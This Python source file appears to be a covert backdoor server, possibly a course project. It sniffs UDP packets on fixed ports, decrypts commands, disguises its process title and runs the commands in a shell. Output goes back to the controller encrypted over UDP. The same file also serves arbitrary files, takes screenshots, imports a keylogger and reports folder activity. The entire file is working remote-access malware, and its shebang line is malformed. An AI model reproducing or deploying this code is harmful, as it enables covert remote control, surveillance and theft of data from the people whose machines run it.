#!/usr/binascii/python3


import os, argparse, time, keylogger, subprocess, logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from subprocess import *
from binascii import hexlify, unhexlify
import binascii
import setproctitle

import threading
from watchdog.observers import Observer
observer = Observer()
import watchdog
from watchdog.events import FileSystemEventHandler
from multiprocessing import Process
import crypto


def readExecute(pkt):
    key = 8
    print("Received message")

    packet = pkt[Raw].load
    print(packet)
    decryptedText = ''
    
    if packet.endswith(b'\t'):
        print("Decrypting with Yiao")
        decryptedText2 = crypto.decryptData2(key, packet)
        decryptedText = crypto.decryptData(decryptedText2)

    elif packet.endswith(b'~'):
        stripPacket = packet[:-1]
        print("Decrypting with RSA")
        decryptedText = crypto.RSADecrypt(stripPacket)
        print(decryptedText)

    else:
        print("Decrypting with AES")
        #key="passwordpassword".encode("utf8")
        decryptedText = crypto.aesDecrypt(packet)
        print(decryptedText)

    splitMessage = decryptedText.split("\"")
    print(splitMessage)
    ptitle = splitMessage[0]
    print("Your process title: " + ptitle)
    command = splitMessage[1]
    print("Your command: " + command)

    setproctitle.setproctitle(ptitle)


    userInput = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    shellOutput = userInput.stdout.read() + userInput.stderr.read()
    newOutput = shellOutput.decode()
    print(newOutput)
    if newOutput == "":
        print("entered here")
        newOutput = "No output from terminal"

    bytesOutput = newOutput.encode("utf8")
    encodedOutput = binascii.hexlify(bytesOutput)

    aesOutput = crypto.aesEncrypt(encodedOutput)

    pkt = IP(dst=pkt[0][1].src)/UDP(dport=8505, sport=8000)/aesOutput
    print(aesOutput)
    time.sleep(0.5)
    send(pkt, verbose=0)
    print("Packet sent")

def screeny(pkt):
    subprocess.Popen("gnome-screenshot --file=picture.png", shell=True)

def startMonitor(pkt):

    print("Monitoring")
    global monitor
    global process
    packet = pkt[Raw].load
    print(packet)
    print("Encrypted Packet above")
    decryptedWatchPacket = crypto.aesDecrypt(packet)
    ip = pkt[IP].src
    print(pkt)
    destination_IP = pkt[0][1].src



    watchMessage = binascii.unhexlify(decryptedWatchPacket)
    parse = watchMessage.decode()
    parseWatch = parse.split("\"")
    processTitle = parseWatch[0]
    watchCommand = parseWatch[1]
    print("Watching..." + watchCommand)
    setproctitle.setproctitle(processTitle)

    if watchCommand == "stop":
        print("Stop watching")
        observer.stop()
        observer.join()
        return
    

    try:
        
        print("Destionation IP: " + ip)
        monitor = observer.schedule(monitorHandler(ip),watchCommand)
        observer.start() 
        
        
        print("Folder Monitoring in session")
        monitoringMessage = "Monitoring: " + watchCommand

        messageEncoded = monitoringMessage.encode("utf-8")
        messageOutput = binascii.hexlify(messageEncoded)
        aesMessageWatch = crypto.aesEncrypt(messageOutput)
        pkt = IP(dst=destination_IP)/UDP(dport=8506, sport=8006)/aesMessageWatch

        time.sleep(0.5)
        send(pkt, verbose=0)
        
    except OSError:
        print ("No path to directory...no file monitored")
        error = "No file monitored...no path to directory"
        output = error.encode("utf-8")
        encodedOutput = output
        pkt = IP(dst=destination_IP)/UDP(dport=8504, sport=8004)/output
        send(pkt, verbose=0)
        return

def sendpkt(msg, dstIp):
    output = msg.encode("utf-8")
    encodedOutput = binascii.hexlify(output)
    aesSendPkt = crypto.aesEncrypt(encodedOutput)
    pkt = IP(dst = dstIp)/UDP(dport=8504, sport=8004)/aesSendPkt
    
    time.sleep(0.1)
    send(pkt, verbose=0)
    print(dstIp)
    print("Packet sent")

def sendFile(pkt):
    print ('Server listening....')
    filename = pkt.load
    decodedFileName = binascii.unhexlify(filename)
    decodedName = decodedFileName.decode("utf-8")
    print(decodedName)
    
    port = 60000                    
    s = socket.socket()             
    s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    
    host = socket.gethostname()     
    s.bind(('', port))            
    s.listen(5)                     
    sending = True

    while sending:
        conn, addr = s.accept()     
        print ('Got connection from', addr)
        data = conn.recv(1024)
        print('Server received', repr(data))
        print('Reading from: ' + decodedName)
        try:
            f = open(decodedName,'rb')
            reading = f.read(1024)
            aesReading = crypto.aesEncrypt(reading)
            while (reading):
                conn.send((aesReading))
                print('Sent ',repr((aesReading)))
                reading = f.read(1024)
            
            f.close()
                
            print('Done sending')
            conn.close()
            sending = False
        except IOError:
            print("File does not exist")
            errorpacket = "No file exists"
            conn.close()
            sending = False


def sniffer():
    sniff(filter="udp and src port 8505 and dst port 8000", prn=readExecute)

def sniffer2():
    sniff(filter="udp and src port 8506 and dst port 8006", prn=startMonitor)

def sniffKeylog():
    sniff(filter="udp and src port 5506 and dst port 5500", prn=sendFile)

def sniffScreeny():
    sniff(filter = "udp and src port 7706 and dst port 7700", prn=screeny)


def main():
    print("Server running!")
    t1 = threading.Thread(target=sniffer, args=[])
    t2 = threading.Thread(target=sniffer2, args=[])
    if not t1.is_alive():
        t1.start()
    if not t2.is_alive():
        t2.start()
    t3 = threading.Thread(target=sniffKeylog, args=[])
    if not t3.is_alive():
        t3.start()

    t4 = threading.Thread(target=sniffScreeny, args=[])
    if not t4.is_alive():
        t4.start()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print ('Exiting..')

'''
This is the file monitoring class that handles all events that occur upon monitoring a
selected folder. Events that occur include creation of file, deletion of file, and modification
or movement of files. Changes made to the file will also notify the source.
'''

class monitorHandler(FileSystemEventHandler):
    sourceIP = ""
    def __init__(self,sourceIP):
        self.sourceIP = sourceIP


    #Event Classes from wactchdog API References
    def on_created(self,event): 
        try:
            file = event.src_path
            f =open(file,'rb')
            read = f.read(1024)
            if not read:
                emptyFile = "File Created: " + event.src_path + " but no data inside"
                sendpkt(emptyFile, self.sourceIP)
                return
            onCreateMsg = "File has been created: " + event.src_path
            sendpkt ( onCreateMsg, self.sourceIP)
            print("File Created: " + event.src_path)
        except IOError as e: 
            if e.errno == 21:
                directoryMsg = "Directory created: " + event.src_path
                print("Folder " + event.src_path + " created")
                sendpkt(directoryMsg, self.sourceIP)
        '''try:
            file=event.src_path
            f = open(file,'rb')
            read = f.read(1024)
            if not read:
                errorMessage = "File Created: " + event.src_path + " but there is no data"
                sendpkt(errorMessage, self.sourceIP)
                return
            onCreateMsg = event.src_path + " created!"           
            sendpkt(onCreateMsg, self.sourceIP)
            print ("File Created: " + event.src_path)

        except IOError as e:
            if e.errno == 21:
                print ("Folder " + event.src_path + " has been created\n")
                '''
        
    def on_deleted(self,event):
        deletedMsg = "File deleted: " + event.src_path + "\n"
        sendpkt (deletedMsg, self.sourceIP)
        
    def on_moved(self,event):
        movedMsg = "File Changed/Modified: " + event.dest_path
        sendpkt (movedMsg, self.sourceIP)



